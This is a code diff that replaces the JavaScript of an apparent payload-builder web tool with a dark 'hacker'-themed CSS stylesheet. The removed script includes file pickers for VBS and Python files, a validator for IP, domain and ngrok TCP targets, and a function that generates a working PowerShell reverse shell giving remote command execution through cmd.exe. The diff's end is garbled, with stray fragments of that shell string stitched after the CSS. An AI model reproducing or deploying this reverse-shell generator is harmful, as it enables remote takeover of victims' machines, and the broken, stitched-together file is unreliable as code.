@@ -1,105 +1,288 @@
-document.addEventListener('DOMContentLoaded', function() {
-    const tabs = document.querySelectorAll('.tab');
-    const tabContents = document.querySelectorAll('.tab-content');
-    
-    tabs.forEach(tab => {
-        tab.addEventListener('click', () => {
-            tabs.forEach(t => t.classList.remove('active'));
-            tabContents.forEach(c => c.classList.remove('active'));
-            
-            tab.classList.add('active');
-            const tabId = tab.getAttribute('data-tab') + '-tab';
-            document.getElementById(tabId).classList.add('active');
-        });
-    });
+:root {
+    --bg-dark: #0a0a12;
+    --bg-darker: #050509;
+    --primary: #5e00ff;
+    --secondary: #00ff9d;
+    --accent: #00b4ff;
+    --danger: #ff00aa;
+    --text: #e0e0e0;
+    --text-muted: #888;
+}
 
-    const vbsFileInput = document.getElementById('vbs-file-input');
-    const vbsBrowseBtn = document.getElementById('vbs-browse');
-    const vbsFileName = document.getElementById('vbs-file-name');
-    
-    vbsBrowseBtn.addEventListener('click', () => {
-        vbsFileInput.click();
-    });
-    
-    vbsFileInput.addEventListener('change', () => {
-        if (vbsFileInput.files.length > 0) {
-            vbsFileName.textContent = vbsFileInput.files[0].name;
-        } else {
-            vbsFileName.textContent = 'No file selected';
-        }
-    });
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Consolas', 'Courier New', monospace;
+}
 
-    const pyFileInput = document.getElementById('py-file-input');
-    const pyBrowseBtn = document.getElementById('py-browse');
-    const pyFileName = document.getElementById('py-file-name');
-    
-    pyBrowseBtn.addEventListener('click', () => {
-        pyFileInput.click();
-    });
-    
-    pyFileInput.addEventListener('change', () => {
-        if (pyFileInput.files.length > 0) {
-            pyFileName.textContent = pyFileInput.files[0].name;
-        } else {
-            pyFileName.textContent = 'No file selected';
-        }
-    });
+body {
+    background-color: var(--bg-dark);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+}
 
-    const modal = document.getElementById('modal');
-    const modalTitle = document.getElementById('modal-title');
-    const modalMessage = document.getElementById('modal-message');
-    const modalClose = document.querySelector('.modal-close');
-    const modalOk = document.getElementById('modal-ok');
-    
-    function showModal(title, message, isError = false) {
-        modalTitle.textContent = title;
-        modalMessage.textContent = message;
-        modal.style.display = 'flex';
-        
-        if (isError) {
-            modalTitle.style.color = 'var(--danger)';
-        } else {
-            modalTitle.style.color = 'var(--secondary)';
-        }
+.container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 2rem;
+}
+
+header {
+    text-align: center;
+    margin-bottom: 2rem;
+    position: relative;
+}
+
+.title {
+    color: var(--secondary);
+    font-size: 2rem;
+    font-weight: bold;
+    margin-bottom: 0.5rem;
+    text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
+    letter-spacing: 2px;
+}
+
+.author {
+    background: linear-gradient(45deg, var(--accent), var(--secondary));
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    font-weight: bold;
+    font-size: 1rem;
+    margin-bottom: 1rem;
+    display: inline-block;
+    cursor: pointer;
+    user-select: all;
+}
+
+.form-group {
+    margin-bottom: 1.5rem;
+}
+
+.form-row {
+    display: flex;
+    align-items: center;
+    margin-bottom: 1rem;
+}
+
+label {
+    color: var(--accent);
+    width: 150px;
+    font-size: 0.9rem;
+}
+
+input[type="text"], 
+input[type="number"],
+textarea {
+    background-color: var(--bg-dark);
+    color: var(--secondary);
+    border: 1px solid var(--primary);
+    border-radius: 3px;
+    padding: 0.8rem;
+    flex: 1;
+    font-size: 0.9rem;
+    transition: all 0.3s ease;
+}
+
+input[type="text"]:focus, 
+input[type="number"]:focus,
+textarea:focus {
+    outline: none;
+    border-color: var(--secondary);
+    box-shadow: 0 0 0 2px rgba(0, 255, 157, 0.2);
+}
+
+textarea {
+    min-height: 200px;
+    resize: vertical;
+    width: 100%;
+}
+
+.btn {
+    background-color: transparent;
+    color: var(--text);
+    border: 2px solid;
+    border-radius: 5px;
+    padding: 0.8rem 1.5rem;
+    font-size: 0.9rem;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 1rem;
+    margin-bottom: 1rem;
+}
+
+.btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transition: all 0.5s ease;
+}
+
+.btn:hover::before {
+    left: 100%;
+}
+
+.btn-primary {
+    border-color: var(--primary);
+    color: var(--primary);
+}
+
+.btn-primary:hover {
+    background-color: var(--primary);
+    color: var(--bg-dark);
+}
+
+.btn-secondary {
+    border-color: var(--secondary);
+    color: var(--secondary);
+}
+
+.btn-secondary:hover {
+    background-color: var(--secondary);
+    color: var(--bg-dark);
+}
+
+.btn-accent {
+    border-color: var(--accent);
+    color: var(--accent);
+}
+
+.btn-accent:hover {
+    background-color: var(--accent);
+    color: var(--bg-dark);
+}
+
+.btn-group {
+    display: flex;
+    flex-wrap: wrap;
+    margin: 1.5rem 0;
+}
+
+.output {
+    margin-top: 1.5rem;
+    background-color: var(--bg-darker);
+    border: 1px solid var(--primary);
+    border-radius: 5px;
+    padding: 1rem;
+    position: relative;
+}
+
+.output-title {
+    color: var(--accent);
+    margin-bottom: 0.5rem;
+    font-size: 0.9rem;
+}
+
+.modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.8);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.modal-content {
+    background-color: var(--bg-dark);
+    border: 1px solid var(--primary);
+    border-radius: 5px;
+    padding: 2rem;
+    max-width: 500px;
+    width: 90%;
+    position: relative;
+    animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+    from { transform: translateY(-50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+.modal-title {
+    color: var(--secondary);
+    margin-bottom: 1rem;
+    font-size: 1.2rem;
+}
+
+.modal-message {
+    margin-bottom: 1.5rem;
+    line-height: 1.5;
+}
+
+.modal-close {
+    position: absolute;
+    top: 1rem;
+    right: 1rem;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 1.5rem;
+    transition: all 0.3s ease;
+}
+
+.modal-close:hover {
+    color: var(--danger);
+}
+
+.modal-footer {
+    display: flex;
+    justify-content: flex-end;
+}
+
+.glow {
+    animation: glow 2s infinite alternate;
+}
+
+@keyframes glow {
+    from {
+        text-shadow: 0 0 5px var(--secondary);
     }
-    
-    modalClose.addEventListener('click', () => {
-        modal.style.display = 'none';
-    });
-    
-    modalOk.addEventListener('click', () => {
-        modal.style.display = 'none';
-    });
-    
-    window.addEventListener('click', (e) => {
-        if (e.target === modal) {
-            modal.style.display = 'none';
-        }
-    });
+    to {
+        text-shadow: 0 0 15px var(--secondary), 0 0 20px var(--primary);
+    }
+}
 
-    function validateIpOrDomain(value) {
-        const ipPattern = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-        const domainPattern = /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$/;
-        const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}$/;
-        return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
+@media (max-width: 768px) {
+    .form-row {
+        flex-direction: column;
+        align-items: flex-start;
     }
-    
-    function validatePort(port) {
-        return port > 0 && port <= 65535;
+
+    label {
+        width: 100%;
+        margin-bottom: 0.5rem;
     }
-    
-    function powershellReverseShell(ip, port) {
-        return (
-            `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
-            "$stream = $client.GetStream();" +
-            "$writer = New-Object System.IO.StreamWriter($stream);" +
-            "$buffer = New-Object System.Byte[] 1024;" +
-            "$encoding = New-Object System.Text.ASCIIEncoding;" +
-            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){" +
-            "$command = $encoding.GetString($buffer, 0, $read);" +
-            "$output = cmd.exe /c $command 2>&1 | Out-String;" +
-            "$writer.WriteLine($output);" +
-            "$writer.Flush()" +
+
+    .btn-group {
+        flex-direction: column;
+    }
+
+    .btn {
+        width: 100%;
+        margin-right: 0;
+        margin-bottom: 0.5rem;
+    }
+    }            "$writer.Flush()" +
             "}"
         );
     }
